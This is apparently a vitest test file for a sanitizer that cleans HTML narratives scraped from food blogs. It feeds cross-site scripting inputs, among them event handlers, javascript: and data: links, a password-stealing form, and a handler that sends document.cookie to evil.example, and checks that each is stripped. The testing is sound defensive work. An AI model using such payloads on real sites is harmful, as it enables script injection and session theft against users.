import { readFileSync } from 'node:fs'
import { gunzipSync } from 'node:zlib'
import { fileURLToPath } from 'node:url'
import { describe, it, expect, vi } from 'vitest'
import { sanitizeNarrative } from '@/lib/sanitize'
import { extract } from '@/lib/extract'
import type { LlmClient } from '@/lib/extract/llm-types'

/**
 * `narrativeHtml` is third-party HTML: the author's prose, lifted off an arbitrary
 * food blog by Readability. Readability drops <script> and <style> elements but
 * leaves inline event handlers untouched -- `<p onclick>` and `<img onerror>` both
 * survive into the stored column. These tests pin the render-time defence.
 */

const ALL_HANDLERS = /\son[a-z]+\s*=/i

describe('sanitizeNarrative: empty input', () => {
  it('returns an empty string for null', () => {
    expect(sanitizeNarrative(null)).toBe('')
  })

  it('returns an empty string for undefined', () => {
    expect(sanitizeNarrative(undefined)).toBe('')
  })

  it('returns an empty string for an empty string', () => {
    expect(sanitizeNarrative('')).toBe('')
  })

  it('returns an empty string for whitespace only', () => {
    expect(sanitizeNarrative('   \n\t ')).toBe('')
  })
})

describe('sanitizeNarrative: ordinary prose survives', () => {
  const KEPT = [
    ['p', '<p>A paragraph.</p>'],
    ['h2', '<h2>A heading</h2>'],
    ['h3', '<h3>A heading</h3>'],
    ['h4', '<h4>A heading</h4>'],
    ['ul/li', '<ul><li>One</li><li>Two</li></ul>'],
    ['ol/li', '<ol><li>One</li><li>Two</li></ol>'],
    ['blockquote', '<blockquote>Quoted.</blockquote>'],
    ['em', '<p><em>emphasis</em></p>'],
    ['strong', '<p><strong>strong</strong></p>'],
    ['br', '<p>one<br />two</p>'],
    ['figure/figcaption', '<figure><figcaption>A caption</figcaption></figure>'],
  ] as const

  for (const [name, html] of KEPT) {
    it(`keeps ${name}`, () => {
      expect(sanitizeNarrative(html)).toBe(html)
    })
  }

  it('keeps an anchor with an http href', () => {
    const out = sanitizeNarrative('<p><a href="https://example.org/x">link</a></p>')
    expect(out).toContain('href="https://example.org/x"')
    expect(out).toContain('>link</a>')
  })

  it('keeps an image with an https src and its alt text', () => {
    const out = sanitizeNarrative('<img src="https://cdn.example.org/a.jpg" alt="A dish" />')
    expect(out).toContain('src="https://cdn.example.org/a.jpg"')
    expect(out).toContain('alt="A dish"')
  })

  it('keeps the text of a multi-element narrative intact', () => {
    const out = sanitizeNarrative(
      '<h2>Why this works</h2><p>Low heat, <em>long</em> time.</p><ul><li>Patience</li></ul>',
    )
    expect(out).toContain('Why this works')
    expect(out).toContain('Low heat,')
    expect(out).toContain('Patience')
  })
})

describe('sanitizeNarrative: event handler attributes (the measured defect)', () => {
  const HANDLERS = ['onclick', 'onerror', 'onload', 'onmouseover'] as const
  const TAGS = ['p', 'h2', 'li', 'blockquote', 'figure', 'em', 'strong'] as const

  for (const handler of HANDLERS) {
    for (const tag of TAGS) {
      it(`strips ${handler} from <${tag}>`, () => {
        const out = sanitizeNarrative(`<${tag} ${handler}="alert(1)">text</${tag}>`)
        expect(out).not.toContain(handler)
        expect(out).not.toContain('alert(1)')
        expect(out).not.toMatch(ALL_HANDLERS)
        expect(out).toContain('text')
      })
    }
  }

  it('strips onerror from an img while keeping the valid src', () => {
    const out = sanitizeNarrative(
      '<img src="https://cdn.example.org/a.jpg" onerror="alert(1)" alt="x" />',
    )
    expect(out).toContain('src="https://cdn.example.org/a.jpg"')
    expect(out).not.toContain('onerror')
    expect(out).not.toContain('alert(1)')
    expect(out).not.toMatch(ALL_HANDLERS)
  })

  it('strips onload from an img with no src at all', () => {
    const out = sanitizeNarrative('<img onload="alert(1)" />')
    expect(out).not.toContain('onload')
    expect(out).not.toMatch(ALL_HANDLERS)
  })

  it('strips several handlers on the same element', () => {
    const out = sanitizeNarrative(
      '<p onclick="a()" onmouseover="b()" onload="c()">prose</p>',
    )
    expect(out).toBe('<p>prose</p>')
  })

  it('strips handlers on nested elements', () => {
    const out = sanitizeNarrative(
      '<ul onclick="a()"><li onmouseover="b()"><strong onerror="c()">deep</strong></li></ul>',
    )
    expect(out).not.toMatch(ALL_HANDLERS)
    expect(out).toContain('deep')
  })
})

describe('sanitizeNarrative: adversarial shapes that trip naive sanitizers', () => {
  it('strips an uppercase ONCLICK', () => {
    const out = sanitizeNarrative('<p ONCLICK="alert(1)">shouty</p>')
    expect(out).toBe('<p>shouty</p>')
  })

  it('strips a mixed-case OnErRoR', () => {
    const out = sanitizeNarrative('<img src="https://a.example/x.png" OnErRoR="alert(1)" />')
    expect(out).not.toMatch(/onerror/i)
    expect(out).not.toContain('alert(1)')
  })

  it('strips a handler written with whitespace before the equals sign', () => {
    const out = sanitizeNarrative('<p onclick = "alert(1)">spaced</p>')
    expect(out).toBe('<p>spaced</p>')
  })

  it('strips a handler written with a newline before the equals sign', () => {
    const out = sanitizeNarrative('<p onclick\n=\n"alert(1)">wrapped</p>')
    expect(out).not.toMatch(ALL_HANDLERS)
    expect(out).toContain('wrapped')
  })

  it('drops a mixed-case JaVaScRiPt: href', () => {
    const out = sanitizeNarrative('<a href="JaVaScRiPt:alert(1)">click</a>')
    expect(out).not.toMatch(/javascript/i)
    expect(out).not.toContain('alert(1)')
    expect(out).toContain('click')
  })

  it('drops a javascript: href padded with whitespace and control characters', () => {
    const out = sanitizeNarrative('<a href="  java\tscript:alert(1)">click</a>')
    expect(out).not.toContain('alert(1)')
    expect(out).not.toMatch(/href\s*=\s*"[^"]*script/i)
  })

  it('drops a nested script inside an allowed tag', () => {
    const out = sanitizeNarrative('<p>before<script>alert(1)</script>after</p>')
    expect(out).not.toContain('<script')
    expect(out).not.toContain('alert(1)')
    expect(out).toContain('before')
    expect(out).toContain('after')
  })

  it('drops a script nested several allowed tags deep', () => {
    const out = sanitizeNarrative(
      '<blockquote><ul><li>keep<script>alert(1)</script></li></ul></blockquote>',
    )
    expect(out).not.toContain('<script')
    expect(out).not.toContain('alert(1)')
    expect(out).toContain('keep')
  })

  it('does not resurrect a tag from an escaped-looking string', () => {
    const out = sanitizeNarrative('<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>')
    expect(out).not.toContain('<script')
    expect(out).toContain('&lt;script&gt;')
  })
})

describe('sanitizeNarrative: URL schemes', () => {
  it.each(['http://example.org/a', 'https://example.org/a', 'mailto:cook@example.org'])(
    'allows href %s',
    (href) => {
      expect(sanitizeNarrative(`<a href="${href}">x</a>`)).toContain(`href="${href}"`)
    },
  )

  it.each([
    'javascript:alert(1)',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'vbscript:msgbox(1)',
    'file:///etc/passwd',
  ])('drops href %s', (href) => {
    const out = sanitizeNarrative(`<a href="${href}">x</a>`)
    expect(out).not.toContain(href)
    expect(out).not.toContain('href=')
  })

  it.each(['http://cdn.example.org/a.png', 'https://cdn.example.org/a.png'])(
    'allows img src %s',
    (src) => {
      expect(sanitizeNarrative(`<img src="${src}" />`)).toContain(`src="${src}"`)
    },
  )

  it.each([
    'javascript:alert(1)',
    'data:image/svg+xml,%3Csvg%20onload%3Dalert(1)%3E',
    'mailto:cook@example.org',
  ])('drops img src %s', (src) => {
    const out = sanitizeNarrative(`<img src="${src}" alt="x" />`)
    expect(out).not.toContain(src)
    expect(out).not.toContain('src=')
  })
})

describe('sanitizeNarrative: external link hardening', () => {
  it('adds rel and target to an http link', () => {
    const out = sanitizeNarrative('<a href="https://example.org/x">x</a>')
    expect(out).toContain('rel="noopener noreferrer"')
    expect(out).toContain('target="_blank"')
  })

  it('overwrites an attacker-supplied rel', () => {
    const out = sanitizeNarrative('<a href="https://example.org/x" rel="opener">x</a>')
    expect(out).toContain('rel="noopener noreferrer"')
    expect(out).not.toContain('rel="opener"')
  })

  it('overwrites an attacker-supplied target', () => {
    const out = sanitizeNarrative('<a href="https://example.org/x" target="_top">x</a>')
    expect(out).toContain('target="_blank"')
    expect(out).not.toContain('_top')
  })
})

describe('sanitizeNarrative: style attributes', () => {
  it('strips style from a paragraph', () => {
    expect(sanitizeNarrative('<p style="color:red">x</p>')).toBe('<p>x</p>')
  })

  it('strips a style that would cover the page', () => {
    const out = sanitizeNarrative(
      '<figure style="position:fixed;inset:0;z-index:99999;background:#fff">x</figure>',
    )
    expect(out).not.toContain('style')
    expect(out).not.toContain('position')
  })

  it('strips style from an image alongside a valid src', () => {
    const out = sanitizeNarrative(
      '<img src="https://cdn.example.org/a.jpg" style="width:100vw" />',
    )
    expect(out).toContain('src="https://cdn.example.org/a.jpg"')
    expect(out).not.toContain('style')
  })

  it('strips class and id too, so the narrative cannot target page CSS', () => {
    const out = sanitizeNarrative('<p class="site-header" id="main">x</p>')
    expect(out).toBe('<p>x</p>')
  })
})

describe('sanitizeNarrative: dangerous elements are dropped outright', () => {
  it.each(['script', 'style', 'iframe', 'object', 'embed', 'form', 'input'])(
    'drops <%s>',
    (tag) => {
      const out = sanitizeNarrative(`<p>keep</p><${tag}>payload</${tag}>`)
      expect(out).not.toContain(`<${tag}`)
      expect(out).toContain('keep')
    },
  )

  it('drops a form and its inputs entirely', () => {
    const out = sanitizeNarrative(
      '<form action="https://evil.example/steal"><input name="password" /><button>Go</button></form>',
    )
    expect(out).not.toContain('<form')
    expect(out).not.toContain('<input')
    expect(out).not.toContain('evil.example')
  })

  it('drops an iframe pointing at an attacker origin', () => {
    const out = sanitizeNarrative('<iframe src="https://evil.example/"></iframe><p>keep</p>')
    expect(out).not.toContain('<iframe')
    expect(out).not.toContain('evil.example')
    expect(out).toContain('keep')
  })

  it('drops an svg carrying a script', () => {
    const out = sanitizeNarrative('<svg><script>alert(1)</script></svg><p>keep</p>')
    expect(out).not.toContain('<svg')
    expect(out).not.toContain('alert(1)')
    expect(out).toContain('keep')
  })

  it('drops html comments', () => {
    expect(sanitizeNarrative('<p>x</p><!-- <script>alert(1)</script> -->')).toBe('<p>x</p>')
  })
})

describe('sanitizeNarrative: idempotence', () => {
  const CASES = [
    '<p onclick="alert(1)">x</p>',
    '<a href="https://example.org/x">link</a>',
    '<a href="javascript:alert(1)">link</a>',
    '<img src="https://cdn.example.org/a.jpg" alt="A &amp; B" onerror="alert(1)" />',
    '<p>Caf&eacute; &amp; cr&egrave;me &mdash; 100&nbsp;g</p>',
    '<blockquote><ul><li>deep<script>alert(1)</script></li></ul></blockquote>',
  ]

  it.each(CASES)('sanitizing twice equals sanitizing once: %s', (html) => {
    const once = sanitizeNarrative(html)
    expect(sanitizeNarrative(once)).toBe(once)
  })
})

describe('sanitizeNarrative: real captured page', () => {
  const noopLlm: LlmClient = {
    enrich: vi.fn().mockResolvedValue(null),
    extractRecipe: vi.fn().mockResolvedValue(null),
  }

  const fixture = fileURLToPath(
    new URL('../../src/lib/extract/fixtures/bonappetit-bolognese.html.gz', import.meta.url),
  )

  it('sanitizes a real narrative without losing the prose', async () => {
    const html = gunzipSync(readFileSync(fixture)).toString('utf-8')
    const result = await extract({
      url: 'https://www.bonappetit.com/recipe/bas-best-bolognese',
      html,
      llm: noopLlm,
    })

    expect(result.narrativeHtml).not.toBeNull()
    const clean = sanitizeNarrative(result.narrativeHtml)

    // The story this feature exists to keep is still there.
    expect(clean).toContain('standout ragù alla Bolognese')
    expect(clean).toContain('What it does take is patience')

    // ...and nothing that runs is.
    expect(clean).not.toMatch(ALL_HANDLERS)
    expect(clean).not.toContain('<script')
    expect(clean).not.toContain('<style')
    expect(clean).not.toContain('javascript:')
    expect(clean).not.toMatch(/\sstyle\s*=/)
  })

  it('is idempotent on the real narrative', async () => {
    const html = gunzipSync(readFileSync(fixture)).toString('utf-8')
    const result = await extract({
      url: 'https://www.bonappetit.com/recipe/bas-best-bolognese',
      html,
      llm: noopLlm,
    })
    const once = sanitizeNarrative(result.narrativeHtml)
    expect(sanitizeNarrative(once)).toBe(once)
  })

  it('survives an injected handler in a real narrative', async () => {
    const html = gunzipSync(readFileSync(fixture)).toString('utf-8')
    const result = await extract({
      url: 'https://www.bonappetit.com/recipe/bas-best-bolognese',
      html,
      llm: noopLlm,
    })
    const poisoned = `${result.narrativeHtml}<p onclick="fetch('https://evil.example/'+document.cookie)">tap me</p>`
    const clean = sanitizeNarrative(poisoned)

    expect(clean).not.toMatch(ALL_HANDLERS)
    expect(clean).not.toContain('document.cookie')
    expect(clean).toContain('tap me')
  })
})
